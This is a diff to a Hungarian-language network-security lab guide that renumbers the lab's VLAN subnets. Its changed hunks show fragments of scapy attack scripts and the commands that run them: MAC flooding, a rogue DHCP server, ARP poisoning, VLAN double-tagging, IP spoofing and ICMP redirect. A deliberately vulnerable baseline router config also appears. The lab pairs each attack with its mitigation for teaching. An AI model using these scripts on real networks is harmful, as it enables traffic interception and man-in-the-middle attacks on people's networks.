@@ -302,14 +302,14 @@ graph TD
     subgraph VLAN99["Menedzsment &middot; VLAN 99 &middot; 10.0.99.0/8"]
         PCA["PC-A: admin / netmiko<br/>NIC 10.0.99.10"]
     end
-    subgraph VLAN10["User &middot; VLAN 10 &middot; 10.10.10.0/8"]
+    subgraph VLAN10["User &middot; VLAN 10 &middot; 172.16.10.0/24"]
         PCV["PC-V: áldozat<br/>NIC DHCP .11-.254"]
         ATK["ATTACKER: támadó<br/>scapy, root"]
     end
-    subgraph VLAN20["Test &middot; VLAN 20 &middot; 10.20.20.0/8"]
-        PCW["PC-W: double-tag cél<br/>NIC 10.20.20.0/8"]
+    subgraph VLAN20["Test &middot; VLAN 20 &middot; 172.16.20.0/24"]
+        PCW["PC-W: double-tag cél<br/>NIC 172.16.20.0/24"]
     end
-    R1["R1: router-on-a-stick + DHCP<br/>Gi0/1.10 10.10.10.1<br/>Gi0/1.20 10.20.20.1<br/>Gi0/1.99 10.0.99.254 mgmt GW"]
+    R1["R1: router-on-a-stick + DHCP<br/>Gi0/1.10 172.16.10.1<br/>Gi0/1.20 172.16.20.1<br/>Gi0/1.99 10.0.99.254 mgmt GW"]
     S1["S1 switch<br/>SVI VLAN99 10.0.99.1"]
     S2["S2 switch<br/>SVI VLAN99 10.0.99.2"]
     R1 ===|"Gi0/1 trunk VLAN 10,20,99"| S1
@@ -327,8 +327,8 @@ graph TD
 | Eszköz | Interfész | VLAN / típus | IP-cím | Szerep |
 |---------------|---------------|---------------|---------------|---------------|
 | **R1** | Gi0/1 | trunk (szülő) | — (nincs IP) | Router-on-a-stick trunk S1 felé |
-| **R1** | Gi0/1.10 | VLAN 10 (dot1Q) | `10.10.10.1/8` | VLAN 10 átjáró + DHCP-kiszolgáló |
-| **R1** | Gi0/1.20 | VLAN 20 (dot1Q) | `10.20.20.1/8` | VLAN 20 átjáró |
+| **R1** | Gi0/1.10 | VLAN 10 (dot1Q) | `172.16.10.1/24` | VLAN 10 átjáró + DHCP-kiszolgáló |
+| **R1** | Gi0/1.20 | VLAN 20 (dot1Q) | `172.16.20.1/24` | VLAN 20 átjáró |
 | **R1** | Gi0/1.99 | VLAN 99 (dot1Q) | `10.0.99.254/8` | VLAN 99 átjáró = a switchek default-gateway-e (menedzsment) |
 | **S1** | SVI VLAN 99 | VLAN 99 | `10.0.99.1/8` | S1 menedzsment-IP (SSH / netmiko) |
 | **S1** | Fa0/1 | VLAN 10 (access) | — | PC-V (áldozat) |
@@ -339,19 +339,19 @@ graph TD
 | **S2** | Fa0/1 | VLAN 20 (access) | — | PC-W (double-tagging cél) |
 | **S2** | Fa0/24 | trunk | — | Trunk S1 felé (VLAN 10,20,99) |
 | **PC-A** | NIC | VLAN 99 | `10.0.99.10/8` (statikus) | Admin gép, netmiko-t futtat |
-| **PC-V** | NIC | VLAN 10 | `10.10.10.0/8` (DHCP, `.11`–`.254`) | Áldozat |
-| **ATTACKER** | NIC | VLAN 10 | `10.10.10.0/8` | Támadó (scapy, root) |
-| **PC-W** | NIC | VLAN 20 | `10.20.20.0/8` | Double-tagging cél (9. fázis) |
+| **PC-V** | NIC | VLAN 10 | `172.16.10.0/24` (DHCP, `.11`–`.254`) | Áldozat |
+| **ATTACKER** | NIC | VLAN 10 | `172.16.10.0/24` | Támadó (scapy, root) |
+| **PC-W** | NIC | VLAN 20 | `172.16.20.0/24` | Double-tagging cél (9. fázis) |
 
 ### VLAN-összefoglaló
 
 | VLAN   | Szerep                  | Alhálózat       | Átjáró                      |
 |------------------|------------------|------------------|--------------------|
-| **10** | User (áldozat + támadó) | `10.10.10.0/8` | `10.10.10.1` (R1 Gi0/1.10)  |
-| **20** | Test (double-tag cél)   | `10.20.20.0/8` | `10.20.20.1` (R1 Gi0/1.20)  |
+| **10** | User (áldozat + támadó) | `172.16.10.0/24` | `172.16.10.1` (R1 Gi0/1.10)  |
+| **20** | Test (double-tag cél)   | `172.16.20.0/24` | `172.16.20.1` (R1 Gi0/1.20)  |
 | **99** | Menedzsment             | `10.0.99.0/8`  | `10.0.99.254` (R1 Gi0/1.99) |
 
-> **DHCP:** a VLAN 10 pool (`USERS`) a `10.10.10.0/8` hálózatot osztja; a `10.10.10.1`–`10.10.10.10` tartomány kizárva (statikus/átjáró), így a PC-V a `.11`-től felfelé kap címet.
+> **DHCP:** a VLAN 10 pool (`USERS`) a `172.16.10.0/24` hálózatot osztja; a `172.16.10.1`–`172.16.10.10` tartomány kizárva (statikus/átjáró), így a PC-V a `.11`-től felfelé kap címet.
 
 **Gépkövetelmények (emlékeztető):**
 
@@ -420,9 +420,9 @@ devices:
 management_vlan: 99
 user_vlan: 10
 test_vlan: 20
-user_subnet: 10.10.10.0/8
-legit_gateway: 10.10.10.1
-legit_dhcp: 10.10.10.1
+user_subnet: 172.16.10.0/24
+legit_gateway: 172.16.10.1
+legit_dhcp: 172.16.10.1
 ```
 
 ## 15. `configs/baseline.yml` — kiinduló, sebezhető állapot
@@ -515,11 +515,11 @@ R1:
     - exit
     - interface GigabitEthernet0/1.10
     - encapsulation dot1Q 10
-    - ip address 10.10.10.1 255.0.0.0
+    - ip address 172.16.10.1 255.255.255.0
     - exit
     - interface GigabitEthernet0/1.20
     - encapsulation dot1Q 20
-    - ip address 10.20.20.1 255.0.0.0
+    - ip address 172.16.20.1 255.255.255.0
     - exit
     - interface GigabitEthernet0/1.99
     - encapsulation dot1Q 99
@@ -527,11 +527,11 @@ R1:
     - exit
     # NINCS 'no ip redirects' — az ICMP-redirect támadás (12. fázis) miatt
   dhcp_pool:
-    - ip dhcp excluded-address 10.10.10.1 10.10.10.10
+    - ip dhcp excluded-address 172.16.10.1 172.16.10.10
     - ip dhcp pool USERS
-    - network 10.10.10.0 255.0.0.0
-    - default-router 10.10.10.1
-    - dns-server 10.10.10.1
+    - network 172.16.10.0 255.255.255.0
+    - default-router 172.16.10.1
+    - dns-server 172.16.10.1
     - exit
 ```
 
@@ -983,7 +983,7 @@ def main():
     print(f"[*] MAC flood indul: {count} keret a(z) {iface}-n...")
     for i in range(count):
         sendp(Ether(src=rand_mac(), dst="ff:ff:ff:ff:ff:ff") /
-              IP(src="10.10.10.66", dst="10.10.10.1") / UDP(), verbose=0)
+              IP(src="172.16.10.66", dst="172.16.10.1") / UDP(), verbose=0)
         if i % 1000 == 0:
             print(f"[+] elküldve: {i}")
     print("[!] Kész. Nézd: 'show mac address-table count' a switchen.")
@@ -1010,7 +1010,7 @@ def main():
     iface, victim_mac = sys.argv[1], sys.argv[2]
     conf.iface = iface
     frame = Ether(src=victim_mac, dst="ff:ff:ff:ff:ff:ff") / \
-            ARP(op=1, hwsrc=victim_mac, psrc="10.10.10.77", pdst="10.10.10.1")
+            ARP(op=1, hwsrc=victim_mac, psrc="172.16.10.77", pdst="172.16.10.1")
     print(f"[*] ARP Request a spoofolt MAC-címmel ({victim_mac})...")
     for _ in range(20):
         sendp(frame, verbose=0)
@@ -1071,8 +1071,8 @@ Futtatás: sudo python rogue_dhcp.py eth0
 import sys
 from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff, conf
 
-ROGUE_IP = "10.10.10.254"
-POOL = [f"10.10.10.{i}" for i in range(100, 200)]
+ROGUE_IP = "172.16.10.254"
+POOL = [f"172.16.10.{i}" for i in range(100, 200)]
 assigned = {}
 
 def handle_discover(pkt):
@@ -1087,7 +1087,7 @@ def handle_discover(pkt):
                 BOOTP(op=2, yiaddr=offer_ip, siaddr=ROGUE_IP,
                       chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
                 DHCP(options=[("message-type", 2), ("server_id", ROGUE_IP),
-                              ("subnet_mask", "255.0.0.0"),
+                              ("subnet_mask", "255.255.255.0"),
                               ("router", ROGUE_IP),          # <-- mi vagyunk a GW
                               ("name_server", ROGUE_IP),
                               ("lease_time", 3600), "end"]))
@@ -1112,7 +1112,7 @@ Mire használod: az áldozat és a gateway felé is a saját MAC-címét hazudja
 """Kétirányú ARP poisoning: az áldozat és a gateway felé is azt hazudjuk,
 hogy a másik MAC-címe a miénk. Így a kétirányú forgalom rajtunk át megy (MITM).
 
-Futtatás: sudo python arp_spoof.py eth0 10.10.10.20 10.10.10.1
+Futtatás: sudo python arp_spoof.py eth0 172.16.10.20 172.16.10.1
 """
 import sys, time
 from scapy.all import ARP, send, get_if_hwaddr, arping, conf
@@ -1264,20 +1264,20 @@ Mire használod: dupla VLAN-címkével keretet juttat a VLAN 20-ba (a PC-W felé
 A második switch a BELSŐ taget értelmezi → a keret bejut a másik VLAN-ba.
 Egyirányú támadás: a válasz nem tud visszajutni.
 
-Futtatás: sudo python vlan_double_tag.py eth0 10.20.20.10 [outer] [inner]
+Futtatás: sudo python vlan_double_tag.py eth0 172.16.20.10 [outer] [inner]
 """
 import sys
 from scapy.all import Ether, Dot1Q, IP, ICMP, sendp, conf
 
 def main():
     iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
-    target = sys.argv[2] if len(sys.argv) > 2 else "10.20.20.10"
+    target = sys.argv[2] if len(sys.argv) > 2 else "172.16.20.10"
     outer = int(sys.argv[3]) if len(sys.argv) > 3 else 1     # trunk natív VLAN-ja
     inner = int(sys.argv[4]) if len(sys.argv) > 4 else 20    # áldozat VLAN-ja
     conf.iface = iface
     frame = (Ether(dst="aa:aa:aa:aa:aa:aa", src=conf.iface.mac) /
              Dot1Q(vlan=outer) / Dot1Q(vlan=inner) /
-             IP(src="10.10.10.66", dst=target) / ICMP(type=8, id=0x1234))
+             IP(src="172.16.10.66", dst=target) / ICMP(type=8, id=0x1234))
     print(f"[*] Double-tagged keretek: outer={outer}, inner={inner}, dst={target}")
     print("[*] Figyeld a PC-W-t (VLAN 20) tcpdumppal az ICMP echo request-et.")
     for _ in range(10):
@@ -1298,15 +1298,15 @@ Mire használod: hamis forrás-IP-jű csomagot küld; ezt csak az IP Source Guar
 Fontos: a keret a támadó VALÓDI MAC-jét hordozza, de hamis forrás-IP-t —
 a DHCP Snooping önmagában nem fogja meg, csak az IP Source Guard.
 
-Futtatás: sudo python ip_spoof.py eth0 10.10.10.50 [dst]
+Futtatás: sudo python ip_spoof.py eth0 172.16.10.50 [dst]
 """
 import sys, time
 from scapy.all import Ether, IP, UDP, sendp, conf
 
 def main():
     iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
-    spoofed = sys.argv[2] if len(sys.argv) > 2 else "10.10.10.50"
-    dst = sys.argv[3] if len(sys.argv) > 3 else "10.10.10.1"
+    spoofed = sys.argv[2] if len(sys.argv) > 2 else "172.16.10.50"
+    dst = sys.argv[3] if len(sys.argv) > 3 else "172.16.10.1"
     conf.iface = iface
     pkt = (Ether(src=conf.iface.mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src=spoofed, dst=dst, ttl=64) / UDP(sport=44444, dport=53))
@@ -1391,7 +1391,7 @@ def main():
     prefix = sys.argv[4] if len(sys.argv) > 4 else "0.0.0.0/0"
     conf.iface = iface
     vmac = resolve(victim, iface)
-    att_ip = getattr(conf.iface, "ip", None) or "10.10.10.66"
+    att_ip = getattr(conf.iface, "ip", None) or "172.16.10.66"
     target_ip = prefix.split("/")[0]
     pkt = (Ether(src=get_if_hwaddr(iface), dst=vmac) /
            IP(src=gateway, dst=victim) /              # "a gateway-től"
@@ -1637,7 +1637,7 @@ ipconfig /release
 ipconfig /renew
 ```
 
-**(2) Megfigyelés:** a PC-V gatewaye a támadó lesz (`10.10.10.254` helyett a hamis szerver). Ellenőrzés a PC-V-n: Linuxon `ip route`, **Windowson `ipconfig`** (nézd az „Alapértelmezett átjáró / Default Gateway" sort). Wireshark-szűrő a DHCP-forgalomra: `bootp`.\
+**(2) Megfigyelés:** a PC-V gatewaye a támadó lesz (`172.16.10.254` helyett a hamis szerver). Ellenőrzés a PC-V-n: Linuxon `ip route`, **Windowson `ipconfig`** (nézd az „Alapértelmezett átjáró / Default Gateway" sort). Wireshark-szűrő a DHCP-forgalomra: `bootp`.\
 **(3) Védelem:** a `dhcp-snooping` már aktív a 3. fázisból (a trust-beállítás a routeri/uplink portra).\
 **(4) Újratámadás:** a PC-V már csak legitim lease-t kap, helyes gatewayjel.
 
@@ -1645,12 +1645,12 @@ ipconfig /renew
 
 ### 5. fázis — ARP poisoning (MITM) → Dynamic ARP Inspection (DAI)
 
-Előbb derítsd ki a PC-V IP-jét (`<PC-V-IP>`), a gateway `10.10.10.1`.
+Előbb derítsd ki a PC-V IP-jét (`<PC-V-IP>`), a gateway `172.16.10.1`.
 
 **(1) Támadás** (ATTACKER):
 
 ``` bash
-sudo python attacker/arp_spoof.py eth0 <PC-V-IP> 10.10.10.1
+sudo python attacker/arp_spoof.py eth0 <PC-V-IP> 172.16.10.1
 ```
 
 **(2) Megfigyelés:** a PC-V-n az `arp -a` parancs (Linuxon és Windowson is ugyanez) — a gateway MAC-címe a **támadó** MAC-címe lett → a forgalom a támadón megy át. Wireshark-szűrő: `arp` (látod a hamis ARP-válaszokat).\
@@ -1737,7 +1737,7 @@ Windowson a **Wireshark**-ban a **Display filter** mezőbe írd: `icmp`.
 **(1) Támadás** (ATTACKER):
 
 ``` bash
-sudo python attacker/vlan_double_tag.py eth0 10.20.20.10
+sudo python attacker/vlan_double_tag.py eth0 172.16.20.10
 ```
 
 **(2) Megfigyelés:** a PC-W (VLAN 20) **ICMP-t kap** a VLAN 10-es támadótól — a dupla címke átvitte a keretet a másik VLAN-ba.\
@@ -1758,7 +1758,7 @@ python push_config.py inventory.yml configs/mitigations.yml native-vlan-hardenin
 **(1) Támadás** (ATTACKER):
 
 ``` bash
-sudo python attacker/ip_spoof.py eth0 10.10.10.50
+sudo python attacker/ip_spoof.py eth0 172.16.10.50
 ```
 
 **(2) Megfigyelés:** védelem nélkül a hamis forrás-IP látszik a dróton. Linuxon `tcpdump -i eth0 -n`, Windowson Wireshark — a forrás-IP oszlopban feltűnik a hamisított cím (szűrő: `ip.src == <hamis-IP>`).\
@@ -1805,7 +1805,7 @@ python push_config.py inventory.yml configs/mitigations.yml lldp-hardening
 **(1) Támadás** (ATTACKER):
 
 ``` bash
-sudo python attacker/icmp_redirect.py eth0 <PC-V-IP> 10.10.10.1
+sudo python attacker/icmp_redirect.py eth0 <PC-V-IP> 172.16.10.1
 ```
 
 **(2) Megfigyelés:** a PC-V route-táblája a támadón át vezet — ellenőrzés a PC-V-n: `ip route`.\
